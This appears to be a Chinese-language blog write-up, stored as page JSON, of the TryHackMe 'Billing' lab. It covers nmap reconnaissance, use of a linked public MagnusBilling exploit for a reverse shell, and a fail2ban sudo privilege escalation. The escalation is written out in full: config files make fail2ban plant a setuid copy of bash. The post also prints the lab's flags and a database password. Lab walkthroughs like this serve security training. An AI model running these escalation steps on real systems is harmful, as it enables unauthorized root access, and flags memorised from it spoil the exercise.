{"pageProps":{"postData":{"id":"TryHackMeLearn - Billing","contentHtml":"<h1>Learn - Billing</h1>\n<blockquote>\n<p><a href=\"https://tryhackme.com/room/billing\">https://tryhackme.com/room/billing</a> | <code>esay</code> | Some mistakes can be costly.</p>\n</blockquote>\n<p>Gain a shell, find the way and escalate your privileges!</p>\n<p><strong>Note:</strong> Bruteforcing is out of scope for this room.</p>\n<h2>前期踩点</h2>\n<pre><code class=\"hljs language-bash\">➜  Billing nmap -sT -min-rate 5000 -p- 10.10.198.194\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 05:28 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.198.194\nHost is up (0.35s latency).\nNot shown: 65489 filtered tcp ports (no-response), 43 closed tcp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n3306/tcp open  mysql\n\nNmap <span class=\"hljs-keyword\">done</span>: 1 IP address (1 host up) scanned <span class=\"hljs-keyword\">in</span> 46.74 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">➜  Billing nmap -sT -A -T4 -O -p 22,80,3306 10.10.198.194     \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-05-24 05:29 EDT\nNmap scan report <span class=\"hljs-keyword\">for</span> 10.10.198.194\nHost is up (0.35s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n| ssh-hostkey: \n|   3072 79:ba:5d:23:35:b2:f0:25:d7:53:5e:c5:b9:af:c0:cc (RSA)\n|   256 4e:c3:34:af:00:b7:35:bc:9f:f5:b0:d2:aa:35:ae:34 (ECDSA)\n|_  256 26:aa:17:e0:c8:2a:c9:d9:98:17:e4:8f:87:73:78:4d (ED25519)\n80/tcp   open  http    Apache httpd 2.4.56 ((Debian))\n|_http-server-header: Apache/2.4.56 (Debian)\n| http-robots.txt: 1 disallowed entry \n|_/mbilling/\n| http-title:             MagnusBilling        \n|_Requested resource was http://10.10.198.194/mbilling/\n3306/tcp open  mysql   MariaDB (unauthorized)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (93%), Linux 2.6.39 - 3.2 (93%), Linux 3.1 - 3.2 (93%), Linux 3.11 (93%), Linux 3.2 - 4.9 (93%)\nNo exact OS matches <span class=\"hljs-keyword\">for</span> host (<span class=\"hljs-built_in\">test</span> conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   347.72 ms 10.21.0.1\n2   347.89 ms 10.10.198.194\n</code></pre>\n<h2>Web 渗透</h2>\n<p>上边 <code>nmap</code> 扫描出一个有趣的目录 <code>/mbilling/</code></p>\n<p><img src=\"/post-images/TryHackMeLearn%20-%20Billing/image.png\" alt=\"image.png\"></p>\n<p>输入账号密码后点击<code>login</code>，进行抓包</p>\n<p><img src=\"/post-images/TryHackMeLearn%20-%20Billing/image1.png\" alt=\"image.png\"></p>\n<p>输入的密码是<code>1</code>，可以看到是通过前端加密了的</p>\n<p>在网上寻找一下 <code>mbilling</code> 的公开漏洞（PS：现在开始IP为<code>10.10.141.110</code>）</p>\n<p>能发现一个CVE：<a href=\"https://www.ddpoc.com/poc/DVB-2023-4549.html\">https://www.ddpoc.com/poc/DVB-2023-4549.html</a></p>\n<p>利用脚本：<a href=\"https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit\">https://github.com/tinashelorenzi/CVE-2023-30258-magnus-billing-v7-exploit</a></p>\n<p>可以利用脚本反弹<code>shell</code></p>\n<p><img src=\"/post-images/TryHackMeLearn%20-%20Billing/image2.png\" alt=\"image.png\"></p>\n<p>在 <code>magnus</code> 用户家目录能读取<code>user.txt</code></p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">cat</span> user.txt\nTHM{4a6831d5f124b25eefb1e92e0f0da4ca}\n</code></pre>\n<h2>提权</h2>\n<p>获得<code>shell</code>后准备进行提权</p>\n<p>查看 <code>sudo</code> 权限</p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> asterisk on Billing:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nRunas and Command-specific defaults <span class=\"hljs-keyword\">for</span> asterisk:\n    Defaults!/usr/bin/fail2ban-client !requiretty\n\nUser asterisk may run the following commands on Billing:\n    (ALL) NOPASSWD: /usr/bin/fail2ban-client\n</code></pre>\n<p>能以<code>root</code>权限执行<code>fail2ban-client</code></p>\n<p>能在网上找到文章：<a href=\"https://juggernaut-sec.com/fail2ban-lpe/\">https://juggernaut-sec.com/fail2ban-lpe/</a> | <a href=\"https://blog.csdn.net/2201_75556043/article/details/146429804\">https://blog.csdn.net/2201_75556043/article/details/146429804</a></p>\n<ol>\n<li>\n<p>并将其配置内容复制到<code>/tmp/fail2ban</code> 里</p>\n<pre><code class=\"hljs language-bash\">rsync -av /etc/fail2ban/ /tmp/fail2ban/\n</code></pre>\n</li>\n<li>\n<p>然后自定义配置文件，该配置文件将 <code>/bin/bash</code> 移动到 <code>/tmp</code>，然后设置<code>sid</code></p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">cat</span> > /tmp/script &#x3C;&#x3C;<span class=\"hljs-string\">EOF\n#!/bin/sh\ncp /bin/bash /tmp/bash\nchmod 755 /tmp/bash\nchmod u+s /tmp/bash\nEOF</span>\n<span class=\"hljs-built_in\">chmod</span> +x /tmp/script\n\n<span class=\"hljs-built_in\">cat</span> > /tmp/fail2ban/action.d/custom-start-command.conf &#x3C;&#x3C;<span class=\"hljs-string\">EOF\n[Definition]\nactionstart = /tmp/script\nEOF</span>\n\n<span class=\"hljs-built_in\">cat</span> >> /tmp/fail2ban/jail.local &#x3C;&#x3C;<span class=\"hljs-string\">EOF\n[my-custom-jail]\nenabled = true\naction = custom-start-command\nEOF</span>\n\n<span class=\"hljs-built_in\">cat</span> > /tmp/fail2ban/filter.d/my-custom-jail.conf &#x3C;&#x3C;<span class=\"hljs-string\">EOF\n[Definition]\nEOF</span>\n</code></pre>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">sudo</span> fail2ban-client -c /tmp/fail2ban/ -v restart\n</code></pre>\n</li>\n<li>\n<p>最后运行 <code>/tmp/bash</code> 即可</p>\n<pre><code class=\"hljs language-bash\">asterisk@Billing:/$ ./tmp/bash -p\nbash-5.1# \n</code></pre>\n<p>读取 <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">bash-5.1# <span class=\"hljs-built_in\">cat</span> root.txt \nTHM{33ad5b530e71a172648f424ec23fae60}\nbash-5.1# <span class=\"hljs-built_in\">cat</span> passwordMysql.<span class=\"hljs-built_in\">log</span> \nMgnodcVwGxW0xLUN\n</code></pre>\n</li>\n</ol>","title":"TryHackMe - Learn - Billing","date":"2025-05-24","updated":"2025-05-24","tags":["TryHackMe","Linux靶机","Billing","fail2ban"],"categories":"靶机","comments":true},"recentPosts":[{"id":"群U靶机Tools","title":"群U靶机 - Tools","date":"2025-06-16","isEncrypted":false,"year":"2025","month":"06","day":"16"},{"id":"HackTheBoxMachine - Ellingson","title":"HackTheBox - Machine - Ellingson","date":"2025-06-15","isEncrypted":false,"year":"2025","month":"06","day":"15"},{"id":"PWN - 基本ROP","title":"PWN - 基本ROP","date":"2025-06-14","isEncrypted":false,"year":"2025","month":"06","day":"15"},{"id":"HackTheBoxMachine - Cap","title":"HackTheBox - Machine - Cap","date":"2025-06-11","isEncrypted":false,"year":"2025","month":"06","day":"11"},{"id":"Personalsunset","title":"Personal - sunset","date":"2025-06-10","isEncrypted":true,"year":"2025","month":"06","day":"10"},{"id":"HackTheBoxSeason8 - TombWatcher","title":"HackTheBox - Season8 - TombWatcher","date":"2025-06-08","isEncrypted":true,"year":"2025","month":"06","day":"08"},{"id":"HackTheBoxMachine - Bucket","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","isEncrypted":false,"year":"2025","month":"06","day":"06"}]},"__N_SSG":true}